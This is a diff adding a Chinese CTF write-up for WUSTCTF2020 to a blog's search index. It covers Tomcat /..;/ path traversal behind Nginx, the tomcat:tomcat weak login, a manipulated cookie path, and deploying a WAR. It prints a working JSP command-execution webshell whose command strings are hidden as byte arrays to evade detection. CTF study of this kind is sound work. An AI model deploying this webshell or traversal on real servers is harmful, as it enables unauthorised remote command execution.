@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[WUSTCTF2020]Train Yourself To Be Godly</title>
+    <url>/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/</url>
+    <content><![CDATA[<p>Tomcat目录穿越+弱口令+getshell</p>
+<a id="more"></a>
+
+<h1 id="0x01-目录穿越"><a href="#0x01-目录穿越" class="headerlink" title="0x01 目录穿越"></a>0x01 目录穿越</h1><p>当服务端采用Nginx做反向代理，Tomcat做为真正的后端时，如果在url中输入下图中的payload就可以进行目录穿越，<a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">参考</a></p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/20200403233654.png" alt="img"></p>
+<p>如下图所示</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428233227189.png" alt="image-20200428233227189"></p>
+<h1 id="0x02-弱口令-getshell"><a href="#0x02-弱口令-getshell" class="headerlink" title="0x02 弱口令+getshell"></a>0x02 弱口令+getshell</h1><p>然后可以访问manager/html，进入tomcat后台，通过tomcat:tomcat弱口令可以进入，具体爆破方式可以<a href="https://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">参考</a>进入后台后就是传🐎了，利用jar生成war包，如下命令即可生成war包。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//来源https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp</span></span><br><span class="line"><span class="comment">//cmd.jsp</span></span><br><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Fly"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428235118890.png" alt="image-20200428235118890" style="zoom:200%;">
+
+<p>之后在浏览器直接传🐎的话，会返回404，然后burp截包，</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428234038133.png" alt="image-20200428234038133"></p>
+<p>将/examples去掉就可以，但是返回403，这里注意上图中红框中的Authorization字段，这个必须要加上，对应的值为 Basic [“tomcat:tomcat”base64加密后的值]，参考师傅的博客产生403的原因是因为请求中没有Cookie信息，然后将这里的cookie信息加入请求头中，还是不可以</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428234333618.png" alt="image-20200428234333618"></p>
+<p>是因为这里cookie的path信息是/manager，需要修改成/..;/manager，然后通过设置burp来截获响应信息。</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428234526552.png" alt="image-20200428234526552"></p>
+<p>然后修改responce信息，</p>
+<img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428234655934.png" alt="image-20200428234655934" style="zoom:150%;">
+
+<p>之后在部署war包的请求中添加这个cookie,然后即可获得200的响应。</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428234920374.png" alt="image-20200428234920374"></p>
+<p>之后访问/..;/shelll/cmd.jsp即可执行命令。</p>
+<p><img src="/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/image-20200428235208977.png" alt="image-20200428235208977" style="zoom:150%;">参考链接</p>
+<p><a href="https://imagin.vip/?p=1323" target="_blank" rel="noopener">https://imagin.vip/?p=1323</a></p>
+<p><a href="https://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">https://payloads.online/archivers/2017-08-17/2</a></p>
+]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NPUCTF_WP</title>
     <url>/2020/04/26/NPUCTF-WP/</url>
     <content><![CDATA[<p>记录几道NPUCTF比赛WP</p>
